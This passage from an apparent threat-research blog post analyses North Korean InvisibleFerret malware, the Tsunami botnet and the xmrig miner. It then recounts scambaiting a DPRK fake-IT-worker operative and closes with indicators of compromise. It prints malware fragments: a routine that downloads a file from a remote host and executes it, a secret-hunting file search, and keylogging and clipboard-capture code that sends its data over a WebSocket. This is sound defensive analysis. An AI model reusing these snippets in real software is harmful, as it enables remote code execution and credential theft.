            myfile = requests.get(host2+"/adc/"+sType, allow_redirects=_T)
            with open(p,'wb') as f:f.write(myfile.content)
            return _T
        except Exception as e:return _F

    def ssh_any(A,args):
        try:
            D=args[_A];p = A.par_dir + "/adc";res=A.down_any(p)
            if res:
                if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
                else:subprocess.Popen([sys.executable,p])
            o = os_type + ' get anydesk'
        except Exception as e:o = f'Err7: {e}';pass
        p={_A:D,_O:o};A.send(code=7,args=p)
{% endhighlight %}

One note worthy feature of this payload is the fact it specifically looks for files related to Github repositories such as .git, readme, licence files etc as these GitHub repos allow them to not only potentially steal sensitive env data like API keys or DB connection strings, but also allows them to use these repos at a later date to continue infecting more victims.

{% highlight python %}
if os_type == "Windows":
  command = 'dir /b /s ' + pat + ' | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"'
else:
  command = 'find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name ' + pat + ' -print'
{% endhighlight %}

The Payload also has a client class which sets up a WebSocket connection, listens for keypresses, calls the clipboard jacking function if "ctrl+c" or "ctrl+v" is detected and then exfiltrates the data over the socket.

{% highlight python %}
if (is_control_down()):key=f"<^{event.Key}>"
elif key==0xD:key="\n"
else:
    if key>=32 and key<=126:key=chr(key)
    else:key=f'<{event.Key}>'
tt += key
if is_control_down() and event.Key == 'C':
    start_time = Timer(0.1, run_copy_clipboard)
    start_time.start()
elif is_control_down() and event.Key == 'V':
    start_time = Timer(0.1, run_copy_clipboard)
    start_time.start()
{% endhighlight %}

## Opening the Floodgates

As we finally approach the the last stage of the InvisibleFerret infection we encounter a Botnet tool called tsunami which installs itself on the victim system and loads tor to be able to communicate over IRC
Like before this new payload called brow9_905.py is again a lambda function containing the Zlib encoded Tsunami payload which we are able to crack open using the same bin-ref oneliner as before however this time we need to run this twice as the first round leads to another batch of Zlib data. The resulting python file contains all the functions and operations needed to install tsunami on the machine, load tor for communication and install xmrig for crypto mining operations. This part of the infection alone contains multiple stages as tsunami extracts its injection and builder scripts from the initial file and executes them to be able to install the final botnet, tor and xmrig executable files. 
One of the files dropped is the tsunami injector python script "Windows Update Script.pyw" in the users start-up directory which is the initial file the victim detected on their PC kickstarting this whole journey.

<img src="/assets/img/beaver/tsunami.png" alt="Tsunami injector path">
*Tsunami injector path*

Probably the most interesting part about tsunami injector script is the method used to pull down the main payload executable. In the code is a list or around 1000 encoded pastebin urls which are decoded and contacted in order to find a valid pastebin hosting the encoded payload url. Not only does this act as a way to allow rotating urls but as it has a 2 second timer per URL it acts as anti analysis as it can take minutes for a valid url to be found

<img src="/assets/img/beaver/pastebin.png" alt="Encoded pastbin urls">
*Encoded pastbin urls*

The Tsunami botnet is usually used to attack insecure DVR devices and linux servers by using known vulnerabilities however the code was leaked on github which is where
it was picked up and the main botnet fucntions are what are being loaded in this case, it is unlear why this is being loaded as it doesnt line up with the normal TTPs
of North Korean APTS.

## Making some money

In an effor to continue the investigation I reached out to the Lucas linkedin page posing as a developer to see if I could get another github sample to analyse, instead what I got was an opertunity to see more of how North Korea targets US citizens. For a while now North Korean actors have been posing as US citizens in order to get remote jobs that allow them to funnel funds out of the US and back to kims regime, lucas told me that if i let him have remote access to my machone and let him set up fake accounts he would pay X amount of money. accoring to Elizabeth Pelker, special agent at the FBI "DPRK remote workers target software engineer, front-end developer and full-stack developer jobs" this again lines up with what we have seen so far. 

In order to see the process of how North koreans set up their USA identities I created a VM usually used for scambaiting and waited to see what "Lucas" Would want. to my suprise he asked me if I would be able to call him on google Meets which I agreed. During the call it wasa very obvious he was using software to alter his voice however his accent was very much still audible.


/assets/audio/part1.mp3

/assets/audio/part2.mp3

*snippets of the google call*

On this call Lucas added me on telegram and told me that they generally anydesk to connect into my Virtual Machine (note anydesk also observed during infection chain). he also told me that he would be using the virtual machine to create accounts on Freelancer,upwork and toptotal as well as creating a LinkedIn profile (again how our victim was initially contacted)

<img src="/assets/img/beaver/telegramchat.png" alt="Telegram chat with lucas">
*Telegram chat with lucas*

Lucas then Anydesked into the Virtual machine where he started creating accounts in my alias' name, suprisingly Lucas opted to use notepad to communicate instead of the telegram or linkedin chats.

<img src="/assets/img/beaver/anydesk.png" alt="Anydesk Connection">
*Anydesk Connection*

The first account he created was a Gmail as this would be what is used to create all the other accounts, this allows him to have full control of the accounts such as password resets and locking out the victim when needed, he then created a LinkedIn profile and this is where things started to get a bit sketchy, Lucas wanted a clean professional headshot to use as the profile picture but since I didnt want to use my own face we opted to try AI generate something that would work, Lucas was initially sceptical but we were able to convince him that it was real, The next thing he did was get the linkedin account closed and needed verification, we are unsure how this was carried out but he then wanted me to use my own ID and real details (neither of exist) to verify the linkedin account, this is a process they use to make the linkedin accounts look more legitimate to the victims. 

As I did not have the details needed to verify the account and due to the fact we didnt want these to actually be used to target victims we pulled the plug disabled all the accounts and cut off his access to the machine. By this time lucas had actually paid out $20 worth of crypto which not only was a nice treat but let us see some of the crypto traffic however that quickly fell apart as it branched in and out too much.

## Conclusion

Based on our research it is clear to say that DPRK hackers are not slowing down on their campains as they are still very actively and persistantly trying to persuade US citizens to unwillingly help them compromise and exfiltrate money back to the home state, The tactics used here show how much access they are trying to get via crypto jacking, and info stealing which would let them gain access to high level systems at the targeted organisations, exfiltrate data and carry put further attacks, The use of US citizens to gain these fake jobs highlights the fact that companies need to strengthen their policies as to them this would just look like a legitimate US citzen as the North Koran would use them, their ID, names and even voices on interviews to help pass any checks and erase suspicion. The North Korean campaigns will not stop any time soon and its up to us to help identify and slow them down as well as educate people on the signs that they might be falling victim to one of these fake githuib repos or job offers.

## EDITS
Since writing this new/modifiedf strains of NK backed malware have been detected that show similar capabilites however have a new code structure and slightly diferent functions for infecting and extracting data.

## IOC

Ip Addresses
* 86[.]104[.]74[.]51
* 95[.]164[.]7[.]17
* 185[.]153[.]182[.]241

# URL paths
side note while these are paths are ones we have directly observed it is important to note the values seen here e.g "/9/905" are specific to this sample and other samples will use other values.
* /mclip/9/905
* /payload/9/905
* /keys
* /uploads
* /brow/9/905
* /adc/9

# Files
* Tsunami installer:{ROAMING_APPDATA_PATH}\Microsoft\Windows\Applications\Runtime Broker.exe
* Tsunami Client:{LOCAL_APPDATA_PATH}\Microsoft\Windows\Applications\Runtime Broker.exe
* XMRig miner:{LOCAL_APPDATA_PATH}\Microsoft\Windows\Applications\msedge.exe